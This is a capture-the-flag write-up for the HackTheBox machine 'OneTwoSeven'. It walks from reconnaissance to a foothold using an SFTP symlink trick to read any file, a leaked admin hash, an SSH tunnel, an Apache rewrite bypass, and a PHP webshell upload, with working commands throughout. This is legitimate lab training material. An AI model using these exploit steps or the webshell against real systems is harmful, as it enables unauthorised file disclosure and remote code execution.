---
title: "OneTwoSeven"
date: 2026-10-20 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, hard, sftp, symlink, source-disclosure, ssh-tunnel, apache-rewrite, file-upload, webshell]
image:
    path: /assets/Images/onetwoseven-001_foothold_rce-www.png
    alt: OneTwoSeven
description: "OneTwoSeven is a hard Linux box whose self-service SFTP accounts allow creating symlinks — link the filesystem root into your web folder and the whole disk becomes readable, leaking the admin source and password. The localhost-only admin panel, reached over an SSH tunnel, blocks uploads with an Apache rewrite rule that is trivially bypassed by gluing the blocked path onto an allowed one, dropping a PHP webshell. This post covers recon through the initial shell."
---

## Overview

OneTwoSeven is a Hard Linux machine built around a static file-hosting service that hands out SFTP credentials to anyone who signs up. The SFTP shell allows `symlink`, which we abuse to read the entire filesystem over the user's web vhost, leaking the admin panel's source and password. The admin panel listens only on localhost, so we tunnel to it over SSH, then defeat its upload restriction — an Apache rewrite rule — to drop a webshell and land a shell as `www-admin-data`.

## Recon

| Port | Service |
|------|---------|
| 22   | OpenSSH (also SFTP) |
| 80   | Apache httpd |
| 60080 | Apache (filtered — localhost only) |

Port 80 is a static file-hosting site with a **Sign up** option. The homepage source references an admin page on **60080** that is only reachable from localhost — a hint to tunnel later.

```bash
nmap -sC -sV 10.129.10.134
```

## Enumeration

Signing up returns a set of SFTP credentials and a personal web page at `http://onetwoseven.htb/~<user>/`:

```bash
curl -s -H "Host: onetwoseven.htb" http://10.129.10.134/signup.php
```

The SFTP shell permits `symlink`. Linking the filesystem root into the web-served folder turns the personal page into a read-anything file browser:

```bash
sshpass -p '<pass>' sftp -o StrictHostKeyChecking=no <user>@10.129.10.134 <<< $'symlink / public_html/root\nbye'
```

Now any file is readable via `http://onetwoseven.htb/~<user>/root/...`. To read PHP **source** (rather than have it execute), link the `.php` to a `.txt` name so the vhost serves it raw:

```bash
sshpass -p '<pass>' sftp -o StrictHostKeyChecking=no <user>@10.129.10.134 <<< $'symlink /var/www/html-admin/login.php public_html/la.txt\nbye'
curl -s -H "Host: onetwoseven.htb" "http://10.129.10.134/~<user>/la.txt"
```

The admin login source contains a hard-coded SHA-256 hash for `ots-admin`, which cracks to `<redacted>`.

## Foothold

The admin panel is localhost-only, so forward it over SSH using the same SFTP credentials:

```bash
sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no -N -L 60080:127.0.0.1:60080 <user>@10.129.10.134 &
```

Log in to the panel (the form needs the `login` button parameter):

```bash
curl -s -c admin.cookie http://127.0.0.1:60080/login.php \
  --data-urlencode "username=ots-admin" --data-urlencode "password=<redacted>" --data-urlencode "login=Login"
```

The panel disables addon uploads with an Apache rewrite rule:
`RewriteRule ^addon-upload.php addons/ots-man-addon.php [L]`. Apache redirects any request to `addon-upload.php` away from the upload handler — but the PHP code authorizes the upload branch by independently checking `$_SERVER['REQUEST_URI']`. Gluing the blocked path onto an allowed one makes the rewrite fire on the *download* prefix while PHP still matches the upload branch:

```bash
printf '<?php system($_GET["pwn"]); ?>' > shell.php
curl -s -b admin.cookie -F "addon=@shell.php" "http://127.0.0.1:60080/addon-download.php&/addon-upload.php"
```

The webshell lands in the served `addons/` directory — command execution as `www-admin-data`:

```bash
curl -s -b admin.cookie -G "http://127.0.0.1:60080/addons/shell.php" --data-urlencode "pwn=id"
```

![www-admin-data RCE](/assets/Images/onetwoseven-001_foothold_rce-www.png)

## User flag

```bash
cat /home/<user>/user.txt   # HTB{...}
```

Access as `www-admin-data` (the user flag is reachable through the panel's default addon credentials over SFTP).

> Foothold complete. Privilege escalation is left as an exercise — this post stops at user.
